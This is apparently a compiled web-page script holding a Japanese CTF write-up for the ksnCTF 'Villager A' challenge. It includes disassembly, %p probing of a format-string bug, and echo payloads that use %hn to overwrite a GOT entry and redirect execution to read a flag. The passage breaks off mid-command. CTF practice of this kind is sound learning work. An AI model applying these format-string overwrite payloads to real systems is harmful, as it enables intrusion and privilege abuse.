(window.webpackJsonp=window.webpackJsonp||[]).push([[36],{208:function(t,s,e){"use strict";e.r(s);var n=e(0),a=Object(n.a)({},function(){var t=this,s=t.$createElement,e=t._self._c||s;return e("div",{staticClass:"content"},[t._m(0),t._v(" "),t._m(1),t._v(" "),t._m(2),t._m(3),t._v(" "),t._m(4),t._m(5),t._v(" "),t._m(6),t._m(7),t._v(" "),t._m(8),t._m(9),t._v(" "),t._m(10),t._m(11),t._v(" "),t._m(12),t._m(13),t._v(" "),t._m(14),t._v(" "),t._m(15),t._v(" "),t._m(16),t._v(" "),t._m(17),t._m(18),t._v(" "),t._m(19),t._m(20),t._v(" "),t._m(21),e("ul",[e("li",[t._v("パイプでバグって正しい結果が出力できていないらしい\n"),e("ul",[e("li",[t._v("ref. "),e("a",{attrs:{href:"https://stackoverflow.com/questions/8121823/gdb-pipe-redirection-error-gdb-hangup-detected-on-fd-0",target:"_blank",rel:"noopener noreferrer"}},[t._v("https://stackoverflow.com/questions/8121823/gdb-pipe-redirection-error-gdb-hangup-detected-on-fd-0"),e("OutboundLink")],1)])])]),t._v(" "),e("li",[t._v("引数ではなく, 呼び出す番地が正しくないという仮説をたててみる")]),t._v(" "),e("li",[t._v("fopenを直接呼ぶのではなく, その少し前を呼ぶのはどう?")]),t._v(" "),e("li",[t._v("jne命令がある(0x0804868f)ので, その後(0x08048691)からなら呼べそう")]),t._v(" "),e("li",[t._v("まとめると次のような感じ")])]),t._v(" "),t._m(22),t._v(" "),t._m(23),t._v(" "),t._m(24),t._m(25),t._v(" "),t._m(26),t._m(27),t._v(" "),t._m(28),t._v(" "),t._m(29)])},[function(){var t=this.$createElement,s=this._self._c||t;return s("h1",{attrs:{id:"ksnctf-villager-a"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#ksnctf-villager-a","aria-hidden":"true"}},[this._v("#")]),this._v(" ksnCTF Villager A")])},function(){var t=this.$createElement,s=this._self._c||t;return s("ul",[s("li",[this._v("sshで接続してみる")])])},function(){var t=this,s=t.$createElement,e=t._self._c||s;return e("div",{staticClass:"language-bash= line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[t._v("$ ssh -p 10022 q4@ctfq.sweetduet.info\nq4@ctfq.sweetduet.info's password: \nLast login: Wed Mar 13 13:43:28 2019 from 10.0.2.2\n[q4@localhost ~]$ ls -l\ntotal 16\n-r--------. 1 q4a  q4a    22  5月 22 02:12 2012 flag.txt\n-rwsr-xr-x. 1 q4a  q4a  5857  5月 22 11:21 2012 q4\n-rw-r--r--. 1 root root  151  6月  1 04:47 2012 readme.txt\n")])]),t._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[t._v("1")]),e("br"),e("span",{staticClass:"line-number"},[t._v("2")]),e("br"),e("span",{staticClass:"line-number"},[t._v("3")]),e("br"),e("span",{staticClass:"line-number"},[t._v("4")]),e("br"),e("span",{staticClass:"line-number"},[t._v("5")]),e("br"),e("span",{staticClass:"line-number"},[t._v("6")]),e("br"),e("span",{staticClass:"line-number"},[t._v("7")]),e("br"),e("span",{staticClass:"line-number"},[t._v("8")]),e("br")])])},function(){var t=this.$createElement,s=this._self._c||t;return s("ul",[s("li",[this._v("flag.txtというファイルがあるので開きたい")])])},function(){var t=this,s=t.$createElement,e=t._self._c||s;return e("div",{staticClass:"language-bash= line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[t._v("[q4@localhost ~]$ cat flag.txt \ncat: flag.txt: Permission denied\n[q4@localhost ~]$ chmod 755 flag.txt \nchmod: changing permissions of `flag.txt': Operation not permitted\n[q4@localhost ~]$ whoami\nq4\n")])]),t._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[t._v("1")]),e("br"),e("span",{staticClass:"line-number"},[t._v("2")]),e("br"),e("span",{staticClass:"line-number"},[t._v("3")]),e("br"),e("span",{staticClass:"line-number"},[t._v("4")]),e("br"),e("span",{staticClass:"line-number"},[t._v("5")]),e("br"),e("span",{staticClass:"line-number"},[t._v("6")]),e("br")])])},function(){var t=this,s=t.$createElement,e=t._self._c||s;return e("ul",[e("li",[e("code",[t._v("permission denied")]),t._v("らしい")]),t._v(" "),e("li",[t._v("当然"),e("code",[t._v("chmod")]),t._v("も使えない")]),t._v(" "),e("li",[t._v("自分の名前は"),e("code",[t._v("q4")]),t._v("なので, "),e("code",[t._v("q4a")]),t._v("は使えない")]),t._v(" "),e("li",[t._v("q4というファイルのパーミッションは"),e("code",[t._v("-rwsr-xr-x")]),t._v("なので, "),e("code",[t._v("q4a")]),t._v("と異なるグループに属しているユーザでも実行はできそう")])])},function(){var t=this,s=t.$createElement,e=t._self._c||s;return e("div",{staticClass:"language-bash= line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[t._v("[q4@localhost ~]$ ./q4\nWhat's your name?\nq4\nHi, q4\n\nDo you want the flag?\nyes\nDo you want the flag?\ntrue\nDo you want the flag?\nyes\nDo you want the flag?\nno\nI see. Good bye.\n")])]),t._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[t._v("1")]),e("br"),e("span",{staticClass:"line-number"},[t._v("2")]),e("br"),e("span",{staticClass:"line-number"},[t._v("3")]),e("br"),e("span",{staticClass:"line-number"},[t._v("4")]),e("br"),e("span",{staticClass:"line-number"},[t._v("5")]),e("br"),e("span",{staticClass:"line-number"},[t._v("6")]),e("br"),e("span",{staticClass:"line-number"},[t._v("7")]),e("br"),e("span",{staticClass:"line-number"},[t._v("8")]),e("br"),e("span",{staticClass:"line-number"},[t._v("9")]),e("br"),e("span",{staticClass:"line-number"},[t._v("10")]),e("br"),e("span",{staticClass:"line-number"},[t._v("11")]),e("br"),e("span",{staticClass:"line-number"},[t._v("12")]),e("br"),e("span",{staticClass:"line-number"},[t._v("13")]),e("br"),e("span",{staticClass:"line-number"},[t._v("14")]),e("br")])])},function(){var t=this.$createElement,s=this._self._c||t;return s("ul",[s("li",[this._v("noを言うまで問うのをやめてくれない")]),this._v(" "),s("li",[s("code",[this._v("objdump")]),this._v("で確認する")])])},function(){var t=this,s=t.$createElement,e=t._self._c||s;return e("div",{staticClass:"language-bash= line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[t._v("$ objdump -d -M intel ./q4\n~~ 略 ~~~\n080485b4 <main>:\n 80485b4:       55                      push   ebp\n 80485b5:       89 e5                   mov    ebp,esp\n 80485b7:       83 e4 f0                and    esp,0xfffffff0\n 80485ba:       81 ec 20 04 00 00       sub    esp,0x420\n 80485c0:       c7 04 24 a4 87 04 08    mov    DWORD PTR [esp],0x80487a4\n 80485c7:       e8 f8 fe ff ff          call   80484c4 <puts@plt>\n 80485cc:       a1 04 9a 04 08          mov    eax,ds:0x8049a04\n 80485d1:       89 44 24 08             mov    DWORD PTR [esp+0x8],eax\n 80485d5:       c7 44 24 04 00 04 00    mov    DWORD PTR [esp+0x4],0x400\n 80485dc:       00 \n 80485dd:       8d 44 24 18             lea    eax,[esp+0x18]\n 80485e1:       89 04 24                mov    DWORD PTR [esp],eax\n 80485e4:       e8 9b fe ff ff          call   8048484 <fgets@plt>\n 80485e9:       c7 04 24 b6 87 04 08    mov    DWORD PTR [esp],0x80487b6\n 80485f0:       e8 bf fe ff ff          call   80484b4 <printf@plt>\n 80485f5:       8d 44 24 18             lea    eax,[esp+0x18]\n 80485f9:       89 04 24                mov    DWORD PTR [esp],eax\n 80485fc:       e8 b3 fe ff ff          call   80484b4 <printf@plt>\n 8048601:       c7 04 24 0a 00 00 00    mov    DWORD PTR [esp],0xa\n 8048608:       e8 67 fe ff ff          call   8048474 <putchar@plt>\n 804860d:       c7 84 24 18 04 00 00    mov    DWORD PTR [esp+0x418],0x1\n 8048614:       01 00 00 00 \n 8048618:       eb 67                   jmp    8048681 <main+0xcd>\n 804861a:       c7 04 24 bb 87 04 08    mov    DWORD PTR [esp],0x80487bb\n 8048621:       e8 9e fe ff ff          call   80484c4 <puts@plt>\n 8048626:       a1 04 9a 04 08          mov    eax,ds:0x8049a04\n 804862b:       89 44 24 08             mov    DWORD PTR [esp+0x8],eax\n 804862f:       c7 44 24 04 00 04 00    mov    DWORD PTR [esp+0x4],0x400\n 8048636:       00 \n 8048637:       8d 44 24 18             lea    eax,[esp+0x18]\n 804863b:       89 04 24                mov    DWORD PTR [esp],eax\n 804863e:       e8 41 fe ff ff          call   8048484 <fgets@plt>\n 8048643:       85 c0                   test   eax,eax\n 8048645:       0f 94 c0                sete   al\n 8048648:       84 c0                   test   al,al\n 804864a:       74 0a                   je     8048656 <main+0xa2>\n 804864c:       b8 00 00 00 00          mov    eax,0x0\n 8048651:       e9 86 00 00 00          jmp    80486dc <main+0x128>\n 8048656:       c7 44 24 04 d1 87 04    mov    DWORD PTR [esp+0x4],0x80487d1\n 804865d:       08 \n 804865e:       8d 44 24 18             lea    eax,[esp+0x18]\n 8048662:       89 04 24                mov    DWORD PTR [esp],eax\n 8048665:       e8 7a fe ff ff          call   80484e4 <strcmp@plt>\n 804866a:       85 c0                   test   eax,eax\n 804866c:       75 13                   jne    8048681 <main+0xcd>\n 804866e:       c7 04 24 d5 87 04 08    mov    DWORD PTR [esp],0x80487d5\n 8048675:       e8 4a fe ff ff          call   80484c4 <puts@plt>\n 804867a:       b8 00 00 00 00          mov    eax,0x0\n 804867f:       eb 5b                   jmp    80486dc <main+0x128>\n 8048681:       8b 84 24 18 04 00 00    mov    eax,DWORD PTR [esp+0x418]\n 8048688:       85 c0                   test   eax,eax\n 804868a:       0f 95 c0                setne  al\n 804868d:       84 c0                   test   al,al\n 804868f:       75 89                   jne    804861a <main+0x66>\n 8048691:       c7 44 24 04 e6 87 04    mov    DWORD PTR [esp+0x4],0x80487e6\n 8048698:       08 \n 8048699:       c7 04 24 e8 87 04 08    mov    DWORD PTR [esp],0x80487e8\n 80486a0:       e8 ff fd ff ff          call   80484a4 <fopen@plt>\n 80486a5:       89 84 24 1c 04 00 00    mov    DWORD PTR [esp+0x41c],eax\n 80486ac:       8b 84 24 1c 04 00 00    mov    eax,DWORD PTR [esp+0x41c]\n 80486b3:       89 44 24 08             mov    DWORD PTR [esp+0x8],eax\n 80486b7:       c7 44 24 04 00 04 00    mov    DWORD PTR [esp+0x4],0x400\n 80486be:       00 \n 80486bf:       8d 44 24 18             lea    eax,[esp+0x18]\n 80486c3:       89 04 24                mov    DWORD PTR [esp],eax\n 80486c6:       e8 b9 fd ff ff          call   8048484 <fgets@plt>\n 80486cb:       8d 44 24 18             lea    eax,[esp+0x18]\n 80486cf:       89 04 24                mov    DWORD PTR [esp],eax\n 80486d2:       e8 dd fd ff ff          call   80484b4 <printf@plt>\n 80486d7:       b8 00 00 00 00          mov    eax,0x0\n 80486dc:       c9                      leave  \n 80486dd:       c3                      ret    \n 80486de:       90                      nop\n 80486df:       90                      nop\n~~ 略 ~~~\n\n")])]),t._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[t._v("1")]),e("br"),e("span",{staticClass:"line-number"},[t._v("2")]),e("br"),e("span",{staticClass:"line-number"},[t._v("3")]),e("br"),e("span",{staticClass:"line-number"},[t._v("4")]),e("br"),e("span",{staticClass:"line-number"},[t._v("5")]),e("br"),e("span",{staticClass:"line-number"},[t._v("6")]),e("br"),e("span",{staticClass:"line-number"},[t._v("7")]),e("br"),e("span",{staticClass:"line-number"},[t._v("8")]),e("br"),e("span",{staticClass:"line-number"},[t._v("9")]),e("br"),e("span",{staticClass:"line-number"},[t._v("10")]),e("br"),e("span",{staticClass:"line-number"},[t._v("11")]),e("br"),e("span",{staticClass:"line-number"},[t._v("12")]),e("br"),e("span",{staticClass:"line-number"},[t._v("13")]),e("br"),e("span",{staticClass:"line-number"},[t._v("14")]),e("br"),e("span",{staticClass:"line-number"},[t._v("15")]),e("br"),e("span",{staticClass:"line-number"},[t._v("16")]),e("br"),e("span",{staticClass:"line-number"},[t._v("17")]),e("br"),e("span",{staticClass:"line-number"},[t._v("18")]),e("br"),e("span",{staticClass:"line-number"},[t._v("19")]),e("br"),e("span",{staticClass:"line-number"},[t._v("20")]),e("br"),e("span",{staticClass:"line-number"},[t._v("21")]),e("br"),e("span",{staticClass:"line-number"},[t._v("22")]),e("br"),e("span",{staticClass:"line-number"},[t._v("23")]),e("br"),e("span",{staticClass:"line-number"},[t._v("24")]),e("br"),e("span",{staticClass:"line-number"},[t._v("25")]),e("br"),e("span",{staticClass:"line-number"},[t._v("26")]),e("br"),e("span",{staticClass:"line-number"},[t._v("27")]),e("br"),e("span",{staticClass:"line-number"},[t._v("28")]),e("br"),e("span",{staticClass:"line-number"},[t._v("29")]),e("br"),e("span",{staticClass:"line-number"},[t._v("30")]),e("br"),e("span",{staticClass:"line-number"},[t._v("31")]),e("br"),e("span",{staticClass:"line-number"},[t._v("32")]),e("br"),e("span",{staticClass:"line-number"},[t._v("33")]),e("br"),e("span",{staticClass:"line-number"},[t._v("34")]),e("br"),e("span",{staticClass:"line-number"},[t._v("35")]),e("br"),e("span",{staticClass:"line-number"},[t._v("36")]),e("br"),e("span",{staticClass:"line-number"},[t._v("37")]),e("br"),e("span",{staticClass:"line-number"},[t._v("38")]),e("br"),e("span",{staticClass:"line-number"},[t._v("39")]),e("br"),e("span",{staticClass:"line-number"},[t._v("40")]),e("br"),e("span",{staticClass:"line-number"},[t._v("41")]),e("br"),e("span",{staticClass:"line-number"},[t._v("42")]),e("br"),e("span",{staticClass:"line-number"},[t._v("43")]),e("br"),e("span",{staticClass:"line-number"},[t._v("44")]),e("br"),e("span",{staticClass:"line-number"},[t._v("45")]),e("br"),e("span",{staticClass:"line-number"},[t._v("46")]),e("br"),e("span",{staticClass:"line-number"},[t._v("47")]),e("br"),e("span",{staticClass:"line-number"},[t._v("48")]),e("br"),e("span",{staticClass:"line-number"},[t._v("49")]),e("br"),e("span",{staticClass:"line-number"},[t._v("50")]),e("br"),e("span",{staticClass:"line-number"},[t._v("51")]),e("br"),e("span",{staticClass:"line-number"},[t._v("52")]),e("br"),e("span",{staticClass:"line-number"},[t._v("53")]),e("br"),e("span",{staticClass:"line-number"},[t._v("54")]),e("br"),e("span",{staticClass:"line-number"},[t._v("55")]),e("br"),e("span",{staticClass:"line-number"},[t._v("56")]),e("br"),e("span",{staticClass:"line-number"},[t._v("57")]),e("br"),e("span",{staticClass:"line-number"},[t._v("58")]),e("br"),e("span",{staticClass:"line-number"},[t._v("59")]),e("br"),e("span",{staticClass:"line-number"},[t._v("60")]),e("br"),e("span",{staticClass:"line-number"},[t._v("61")]),e("br"),e("span",{staticClass:"line-number"},[t._v("62")]),e("br"),e("span",{staticClass:"line-number"},[t._v("63")]),e("br"),e("span",{staticClass:"line-number"},[t._v("64")]),e("br"),e("span",{staticClass:"line-number"},[t._v("65")]),e("br"),e("span",{staticClass:"line-number"},[t._v("66")]),e("br"),e("span",{staticClass:"line-number"},[t._v("67")]),e("br"),e("span",{staticClass:"line-number"},[t._v("68")]),e("br"),e("span",{staticClass:"line-number"},[t._v("69")]),e("br"),e("span",{staticClass:"line-number"},[t._v("70")]),e("br"),e("span",{staticClass:"line-number"},[t._v("71")]),e("br"),e("span",{staticClass:"line-number"},[t._v("72")]),e("br"),e("span",{staticClass:"line-number"},[t._v("73")]),e("br"),e("span",{staticClass:"line-number"},[t._v("74")]),e("br"),e("span",{staticClass:"line-number"},[t._v("75")]),e("br"),e("span",{staticClass:"line-number"},[t._v("76")]),e("br"),e("span",{staticClass:"line-number"},[t._v("77")]),e("br"),e("span",{staticClass:"line-number"},[t._v("78")]),e("br"),e("span",{staticClass:"line-number"},[t._v("79")]),e("br")])])},function(){var t=this,s=t.$createElement,e=t._self._c||s;return e("ul",[e("li",[t._v("出力より, 次のようにmainが実行されていることがわかる\n"),e("ul",[e("li",[t._v("puts")]),t._v(" "),e("li",[t._v("fgets")]),t._v(" "),e("li",[t._v("printf")]),t._v(" "),e("li",[t._v("printf")]),t._v(" "),e("li",[t._v("putchar")]),t._v(" "),e("li",[t._v("fopen")]),t._v(" "),e("li",[t._v("puts")])])]),t._v(" "),e("li",[t._v("fgetsを使用しているのでbofかformat stringを狙える気がする")])])},function(){var t=this,s=t.$createElement,e=t._self._c||s;return e("div",{staticClass:"language-bash= line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[t._v("[q4@localhost ~]$ ./q4\nWhat's your name?\nAAAAAAAAAAAAAAAAAAAAAa\nHi, AAAAAAAAAAAAAAAAAAAAAa\n\nDo you want the flag?\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nDo you want the flag?\n^C\n[q4@localhost ~]$ ./q4\nWhat's your name?\nAAAA,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p\nHi, AAAA,0x400,0x9258c0,0x8,0x14,0xc84fc4,0x41414141,0x2c70252c,0x252c7025,0x70252c70,0x2c70252c,0x252c7025,0x70252c70,0x2c70252c,0x252c7025\n")])]),t._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[t._v("1")]),e("br"),e("span",{staticClass:"line-number"},[t._v("2")]),e("br"),e("span",{staticClass:"line-number"},[t._v("3")]),e("br"),e("span",{staticClass:"line-number"},[t._v("4")]),e("br"),e("span",{staticClass:"line-number"},[t._v("5")]),e("br"),e("span",{staticClass:"line-number"},[t._v("6")]),e("br"),e("span",{staticClass:"line-number"},[t._v("7")]),e("br"),e("span",{staticClass:"line-number"},[t._v("8")]),e("br"),e("span",{staticClass:"line-number"},[t._v("9")]),e("br"),e("span",{staticClass:"line-number"},[t._v("10")]),e("br"),e("span",{staticClass:"line-number"},[t._v("11")]),e("br"),e("span",{staticClass:"line-number"},[t._v("12")]),e("br"),e("span",{staticClass:"line-number"},[t._v("13")]),e("br")])])},function(){var t=this,s=t.$createElement,e=t._self._c||s;return e("ul",[e("li",[t._v("format stringで行けそう!")]),t._v(" "),e("li",[t._v("引数は6個目")]),t._v(" "),e("li",[t._v("6個目にsystem関数の実行番地を仕込んで実行すれば"),e("code",[t._v("/bin/sh")]),t._v("を実行できるか?")]),t._v(" "),e("li",[t._v("できなさそう(system関数の番地がわからない)")]),t._v(" "),e("li",[t._v("使えそうな関数を探す")]),t._v(" "),e("li")])},function(){var t=this,s=t.$createElement,e=t._self._c||s;return e("div",{staticClass:"language-bash= line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[t._v("[q4@localhost ~]$ objdump -d -M intel -j .plt ./q4 \n\n./q4:     file format elf32-i386\n\n\nDisassembly of section .plt:\n\n08048454 <__gmon_start__@plt-0x10>:\n8048454:       ff 35 d4 99 04 08       push   DWORD PTR ds:0x80499d4\n804845a:       ff 25 d8 99 04 08       jmp    DWORD PTR ds:0x80499d8\n8048460:       00 00                   add    BYTE PTR [eax],al\n...\n\n08048464 <__gmon_start__@plt>:\n8048464:       ff 25 dc 99 04 08       jmp    DWORD PTR ds:0x80499dc\n804846a:       68 00 00 00 00          push   0x0\n804846f:       e9 e0 ff ff ff          jmp    8048454 <_init+0x30>\n\n08048474 <putchar@plt>:\n8048474:       ff 25 e0 99 04 08       jmp    DWORD PTR ds:0x80499e0\n804847a:       68 08 00 00 00          push   0x8\n804847f:       e9 d0 ff ff ff          jmp    8048454 <_init+0x30>\n\n08048484 <fgets@plt>:\n8048484:       ff 25 e4 99 04 08       jmp    DWORD PTR ds:0x80499e4\n804848a:       68 10 00 00 00          push   0x10\n804848f:       e9 c0 ff ff ff          jmp    8048454 <_init+0x30>\n\n08048494 <__libc_start_main@plt>:\n8048494:       ff 25 e8 99 04 08       jmp    DWORD PTR ds:0x80499e8\n804849a:       68 18 00 00 00          push   0x18\n804849f:       e9 b0 ff ff ff          jmp    8048454 <_init+0x30>\n\n080484a4 <fopen@plt>:\n80484a4:       ff 25 ec 99 04 08       jmp    DWORD PTR ds:0x80499ec\n80484aa:       68 20 00 00 00          push   0x20\n80484af:       e9 a0 ff ff ff          jmp    8048454 <_init+0x30>\n\n080484b4 <printf@plt>:\n80484b4:       ff 25 f0 99 04 08       jmp    DWORD PTR ds:0x80499f0\n80484ba:       68 28 00 00 00          push   0x28\n80484bf:       e9 90 ff ff ff          jmp    8048454 <_init+0x30>\n\n080484c4 <puts@plt>:\n80484c4:       ff 25 f4 99 04 08       jmp    DWORD PTR ds:0x80499f4\n80484ca:       68 30 00 00 00          push   0x30\n80484cf:       e9 80 ff ff ff          jmp    8048454 <_init+0x30>\n\n080484d4 <__gxx_personality_v0@plt>:\n80484d4:       ff 25 f8 99 04 08       jmp    DWORD PTR ds:0x80499f8\n80484da:       68 38 00 00 00          push   0x38\n80484df:       e9 70 ff ff ff          jmp    8048454 <_init+0x30>\n\n080484e4 <strcmp@plt>:\n80484e4:       ff 25 fc 99 04 08       jmp    DWORD PTR ds:0x80499fc\n80484ea:       68 40 00 00 00          push   0x40\n80484ef:       e9 60 ff ff ff          jmp    8048454 <_init+0x30>\n")])]),t._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[t._v("1")]),e("br"),e("span",{staticClass:"line-number"},[t._v("2")]),e("br"),e("span",{staticClass:"line-number"},[t._v("3")]),e("br"),e("span",{staticClass:"line-number"},[t._v("4")]),e("br"),e("span",{staticClass:"line-number"},[t._v("5")]),e("br"),e("span",{staticClass:"line-number"},[t._v("6")]),e("br"),e("span",{staticClass:"line-number"},[t._v("7")]),e("br"),e("span",{staticClass:"line-number"},[t._v("8")]),e("br"),e("span",{staticClass:"line-number"},[t._v("9")]),e("br"),e("span",{staticClass:"line-number"},[t._v("10")]),e("br"),e("span",{staticClass:"line-number"},[t._v("11")]),e("br"),e("span",{staticClass:"line-number"},[t._v("12")]),e("br"),e("span",{staticClass:"line-number"},[t._v("13")]),e("br"),e("span",{staticClass:"line-number"},[t._v("14")]),e("br"),e("span",{staticClass:"line-number"},[t._v("15")]),e("br"),e("span",{staticClass:"line-number"},[t._v("16")]),e("br"),e("span",{staticClass:"line-number"},[t._v("17")]),e("br"),e("span",{staticClass:"line-number"},[t._v("18")]),e("br"),e("span",{staticClass:"line-number"},[t._v("19")]),e("br"),e("span",{staticClass:"line-number"},[t._v("20")]),e("br"),e("span",{staticClass:"line-number"},[t._v("21")]),e("br"),e("span",{staticClass:"line-number"},[t._v("22")]),e("br"),e("span",{staticClass:"line-number"},[t._v("23")]),e("br"),e("span",{staticClass:"line-number"},[t._v("24")]),e("br"),e("span",{staticClass:"line-number"},[t._v("25")]),e("br"),e("span",{staticClass:"line-number"},[t._v("26")]),e("br"),e("span",{staticClass:"line-number"},[t._v("27")]),e("br"),e("span",{staticClass:"line-number"},[t._v("28")]),e("br"),e("span",{staticClass:"line-number"},[t._v("29")]),e("br"),e("span",{staticClass:"line-number"},[t._v("30")]),e("br"),e("span",{staticClass:"line-number"},[t._v("31")]),e("br"),e("span",{staticClass:"line-number"},[t._v("32")]),e("br"),e("span",{staticClass:"line-number"},[t._v("33")]),e("br"),e("span",{staticClass:"line-number"},[t._v("34")]),e("br"),e("span",{staticClass:"line-number"},[t._v("35")]),e("br"),e("span",{staticClass:"line-number"},[t._v("36")]),e("br"),e("span",{staticClass:"line-number"},[t._v("37")]),e("br"),e("span",{staticClass:"line-number"},[t._v("38")]),e("br"),e("span",{staticClass:"line-number"},[t._v("39")]),e("br"),e("span",{staticClass:"line-number"},[t._v("40")]),e("br"),e("span",{staticClass:"line-number"},[t._v("41")]),e("br"),e("span",{staticClass:"line-number"},[t._v("42")]),e("br"),e("span",{staticClass:"line-number"},[t._v("43")]),e("br"),e("span",{staticClass:"line-number"},[t._v("44")]),e("br"),e("span",{staticClass:"line-number"},[t._v("45")]),e("br"),e("span",{staticClass:"line-number"},[t._v("46")]),e("br"),e("span",{staticClass:"line-number"},[t._v("47")]),e("br"),e("span",{staticClass:"line-number"},[t._v("48")]),e("br"),e("span",{staticClass:"line-number"},[t._v("49")]),e("br"),e("span",{staticClass:"line-number"},[t._v("50")]),e("br"),e("span",{staticClass:"line-number"},[t._v("51")]),e("br"),e("span",{staticClass:"line-number"},[t._v("52")]),e("br"),e("span",{staticClass:"line-number"},[t._v("53")]),e("br"),e("span",{staticClass:"line-number"},[t._v("54")]),e("br"),e("span",{staticClass:"line-number"},[t._v("55")]),e("br"),e("span",{staticClass:"line-number"},[t._v("56")]),e("br"),e("span",{staticClass:"line-number"},[t._v("57")]),e("br")])])},function(){var t=this.$createElement,s=this._self._c||t;return s("ul",[s("li",[this._v("fopen関数が使えるのでは?")]),this._v(" "),s("li",[this._v("先ほどのmain関数を見返してみると, fopenしてくれている部分がある")]),this._v(" "),s("li",[this._v("このfopenをprintfとかputsとかから参照してやれば良さそう?")]),this._v(" "),s("li",[this._v("fgetsで入力文字列の上書きをするので, fgetsの後のprintfをcallする関数を上書きしてみる")])])},function(){var t=this.$createElement,s=this._self._c||t;return s("h2",{attrs:{id:"攻撃のまとめ"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#攻撃のまとめ","aria-hidden":"true"}},[this._v("#")]),this._v(" 攻撃のまとめ")])},function(){var t=this,s=t.$createElement,e=t._self._c||s;return e("ul",[e("li",[t._v("fopen関数の番地は, "),e("code",[t._v("0x080484a4")])]),t._v(" "),e("li",[t._v("printf関数の番地は, "),e("code",[t._v("0x080484b4")])]),t._v(" "),e("li",[t._v("printf関数内で呼び出しているのは, "),e("code",[t._v("0x080499f0")]),t._v("なので, これを"),e("code",[t._v("0x080486a0")]),t._v("に上書きする")])])},function(){var t=this,s=t.$createElement,e=t._self._c||s;return e("table",[e("thead",[e("tr",[e("th",{staticStyle:{"text-align":"center"}},[t._v("入力アドレス")]),t._v(" "),e("th",{staticStyle:{"text-align":"center"}},[t._v("出力バイト数")]),t._v(" "),e("th",{staticStyle:{"text-align":"center"}},[t._v("総出力バイト数")]),t._v(" "),e("th",{staticStyle:{"text-align":"center"}},[t._v("補足")])])]),t._v(" "),e("tbody",[e("tr",[e("td",{staticStyle:{"text-align":"center"}},[t._v("0x080499f0")]),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[t._v("4")]),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[t._v("4")]),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[t._v("4バイトずつ攻撃")])]),t._v(" "),e("tr",[e("td",{staticStyle:{"text-align":"center"}},[t._v("0x080499f2")]),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[t._v("4")]),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[t._v("8")]),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[t._v("''")])]),t._v(" "),e("tr",[e("td",{staticStyle:{"text-align":"center"}},[t._v("%39400x")]),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[t._v("39400")]),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[t._v("39408")]),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[t._v("39408(0x99f0)-8=39400")])]),t._v(" "),e("tr",[e("td",{staticStyle:{"text-align":"center"}},[t._v("%6$n")]),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[t._v("0")]),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[t._v("39408")]),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[t._v("引数は6個目から")])]),t._v(" "),e("tr",[e("td",{staticStyle:{"text-align":"center"}},[t._v("%28180x")]),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[t._v("28180")]),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[t._v("67588")]),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[t._v("67588(0x0804)-39408=28180")])]),t._v(" "),e("tr",[e("td",{staticStyle:{"text-align":"center"}},[t._v("%7$n")]),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[t._v("0")]),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[t._v("67588")]),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[t._v("次は7個目")])])])])},function(){var t=this.$createElement,s=this._self._c||t;return s("div",{staticClass:"language-bash= line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-text"}},[s("code",[this._v("echo -e '\\xf0\\x99\\x04\\x08\\xf2\\x99\\x04\\x08%39400x%6$hn%28180x%7$hn' | ./q4\n")])]),this._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[this._v("1")]),s("br")])])},function(){var t=this.$createElement,s=this._self._c||t;return s("ul",[s("li",[this._v("通らない")]),this._v(" "),s("li",[this._v("printf(0x80499f0)の代わりにputchar(0x80499e0)を使ってみる")])])},function(){var t=this.$createElement,s=this._self._c||t;return s("div",{staticClass:"language-bash= line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-text"}},[s("code",[this._v("[q4@localhost ~]$ echo -e '\\xe0\\x99\\x04\\x08\\xe2\\x99\\x04\\x08%39400x%6$hn%28180x%7$hn' | ./q4\n~~ 略 ~~~\nSegmentation Fault\n~~ 略 ~~~\n")])]),this._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[this._v("1")]),s("br"),s("span",{staticClass:"line-number"},[this._v("2")]),s("br"),s("span",{staticClass:"line-number"},[this._v("3")]),s("br"),s("span",{staticClass:"line-number"},[this._v("4")]),s("br")])])},function(){var t=this.$createElement,s=this._self._c||t;return s("ul",[s("li",[this._v("gdbで原因を探る")])])},function(){var t=this.$createElement,s=this._self._c||t;return s("div",{staticClass:"language-bash= line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-text"}},[s("code",[this._v("[q4@localhost ~]$ echo -e 